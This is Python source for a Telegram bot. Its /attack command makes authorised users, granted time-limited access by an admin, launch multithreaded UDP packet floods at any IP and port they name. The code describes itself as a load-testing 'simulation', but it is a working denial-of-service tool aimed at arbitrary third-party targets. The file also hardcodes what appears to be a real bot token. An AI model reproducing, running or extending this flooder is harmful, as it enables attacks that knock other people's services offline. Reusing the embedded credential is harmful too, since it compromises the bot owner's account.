import telebot
import threading
import socket
import time
import requests
import os
from datetime import datetime, timedelta

# Replace with your Telegram bot token
BOT_TOKEN = "7926443549:AAFnBllo1Cd1cj3HQRJO3MFgIbigap6GLVc"
# Replace with your Telegram user ID (admin only)
ADMIN_ID = 6234296330

# Initialize the bot
bot = telebot.TeleBot(BOT_TOKEN)

# File paths to persist authorized and all users
AUTHORIZED_USERS_FILE = 'authorized_users.txt'
ALL_USERS_FILE = 'all_users.txt'

# Get the current date and time
def get_current_time():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

# Load authorized users from a file (if exists)
def load_authorized_users():
    if os.path.exists(AUTHORIZED_USERS_FILE):
        with open(AUTHORIZED_USERS_FILE, 'r') as f:
            return {int(line.split()[0]): datetime.strptime(line.split()[1], '%Y-%m-%d') for line in f}
    return {ADMIN_ID: datetime.max}  # Default to admin being the only authorized user with infinite expiry

# Save authorized users to a file
def save_authorized_users():
    with open(AUTHORIZED_USERS_FILE, 'w') as f:
        for user_id, expiry in authorized_users.items():
            f.write(f"{user_id} {expiry.strftime('%Y-%m-%d')}\n")

# Load all users who interacted with the bot from a file (if exists)
def load_all_users():
    if os.path.exists(ALL_USERS_FILE):
        with open(ALL_USERS_FILE, 'r') as f:
            return set(int(line.strip()) for line in f)
    return set()

# Save all users to a file
def save_all_users():
    with open(ALL_USERS_FILE, 'w') as f:
        for user_id in all_users:
            f.write(f"{user_id}\n")

# Initialize user sets
authorized_users = load_authorized_users()
all_users = load_all_users()

def send_packets(ip, port, duration, threads):
    """Simulates sending packets for load testing."""
    end_time = time.time() + duration

    def send():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            packet = b"X" * 1024  # 1KB packet
            while time.time() < end_time:
                try:
                    sock.sendto(packet, (ip, port))
                except Exception as e:
                    print(f"Error: {e}")

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send)
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

@bot.message_handler(commands=['start'])
def start_command(message):
    # Ensure that the user is added and saved to the all_users list
    all_users.add(message.from_user.id)
    save_all_users()  # Save all users to file
    
    # Reply with current date and time
    bot.reply_to(
        message,
        f"Welcome to the battlefield – where legends are forged. Will you rise to be the one 🎇🎆\n\n"
        f"Current Date and Time: {get_current_time()}\n\n"
        "Commands:\n"
        "/ping <URL> - Check server status\n"
        "/attack <IP> <PORT> <DURATION> <THREADS> - Simulate traffic generation (Admin or authorized users only)\n"
        "/allow <USER_ID> <DAYS> - Allow another user to use restricted commands for a specific number of days (Admin only)\n"
        "/remove <USER_ID> - Remove a user from authorized list (Admin only)\n"
        "/allusers - List all users who have interacted with this bot (Admin only)"
    )

@bot.message_handler(commands=['ping'])
def ping_server(message):
    # Ensure that the user is added and saved to the all_users list
    all_users.add(message.from_user.id)
    save_all_users()  # Save all users to file
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, f"Usage: /ping <URL>")
            return

        url = args[1]
        bot.reply_to(message, f"Pinging {url}...\nCurrent Date and Time: {get_current_time()}")
        start_time = time.time()
        response = requests.get(url, timeout=5)
        end_time = time.time()

        if response.status_code == 200:
            latency = round((end_time - start_time) * 1000, 2)
            bot.reply_to(message, f"✅ {url} is online. Latency: {latency} ms.\nCurrent Date and Time: {get_current_time()}")
        else:
            bot.reply_to(message, f"⚠️ {url} responded with status code: {response.status_code}\nCurrent Date and Time: {get_current_time()}")
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"❌ Could not reach {url}. Error: {e}\nCurrent Date and Time: {get_current_time()}")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    # Ensure that the user is added and saved to the all_users list
    all_users.add(message.from_user.id)
    save_all_users()  # Save all users to file
    user_id = message.from_user.id
    if user_id not in authorized_users or authorized_users[user_id] < datetime.now():
        bot.reply_to(message, f"⛔ You do not have permission to use this command or your access has expired.\nCurrent Date and Time: {get_current_time()}")
        return

    args = message.text.split()
    if len(args) != 5:
        bot.reply_to(message, f"Usage: /attack <IP> <PORT> <DURATION> <THREADS>\nCurrent Date and Time: {get_current_time()}")
        return

    try:
        ip = args[1]
        port = int(args[2])
        duration = int(args[3])
        threads = int(args[4])

        bot.reply_to(message, f"⚡ Starting attack on {ip}:{port} for {duration} seconds with {threads} threads...\nCurrent Date and Time: {get_current_time()}")
        threading.Thread(target=send_packets, args=(ip, port, duration, threads)).start()
        bot.reply_to(message, f"✅ Attack simulation started. Check your server's resilience.\nCurrent Date and Time: {get_current_time()}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}\nCurrent Date and Time: {get_current_time()}")

@bot.message_handler(commands=['allow'])
def allow_user(message):
    # Ensure that the user is added and saved to the all_users list
    all_users.add(message.from_user.id)
    save_all_users()  # Save all users to file
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, f"⛔ Only the admin can use this command.\nCurrent Date and Time: {get_current_time()}")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, f"Usage: /allow <USER_ID> <DAYS>\nCurrent Date and Time: {get_current_time()}")
        return

    try:
        user_id = int(args[1])
        days = int(args[2])
        expiry_date = datetime.now() + timedelta(days=days)
        authorized_users[user_id] = expiry_date
        save_authorized_users()  # Save authorized users to file
        bot.reply_to(message, f"✅ User {user_id} is now authorized to use restricted commands for {days} days (until {expiry_date.strftime('%Y-%m-%d')}).\nCurrent Date and Time: {get_current_time()}")
    except ValueError:
        bot.reply_to(message, f"❌ Invalid input. Please provide a valid numeric USER_ID and DAYS.\nCurrent Date and Time: {get_current_time()}")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    # Ensure that the user is added and saved to the all_users list
    all_users.add(message.from_user.id)
    save_all_users()  # Save all users to file
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, f"⛔ Only the admin can use this command.\nCurrent Date and Time: {get_current_time()}")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"Usage: /remove <USER_ID>\nCurrent Date and Time: {get_current_time()}")
        return

    try:
        user_id = int(args[1])
        if user_id in authorized_users:
            del authorized_users[user_id]
            save_authorized_users()  # Save updated authorized users list
            bot.reply_to(message, f"✅ User {user_id} has been removed from the authorized list.\nCurrent Date and Time: {get_current_time()}")
        else:
            bot.reply_to(message, f"❌ User {user_id} is not authorized.\nCurrent Date and Time: {get_current_time()}")
    except ValueError:
        bot.reply_to(message, f"❌ Invalid USER_ID. Please provide a valid numeric user ID.\nCurrent Date and Time: {get_current_time()}")

@bot.message_handler(commands=['allusers'])
def list_all_users(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, f"⛔ Only the admin can use this command.\nCurrent Date and Time: {get_current_time()}")
        return

    user_list = "\n".join([f"{user} (expires: {expiry.strftime('%Y-%m-%d')})" for user, expiry in authorized_users.items()])
    bot.reply_to(message, f"👥 All users who interacted with the bot:\n{user_list}\nCurrent Date and Time: {get_current_time()}")

# Load the users when the bot starts
print("Bot is running...")

# Start polling
bot.polling()
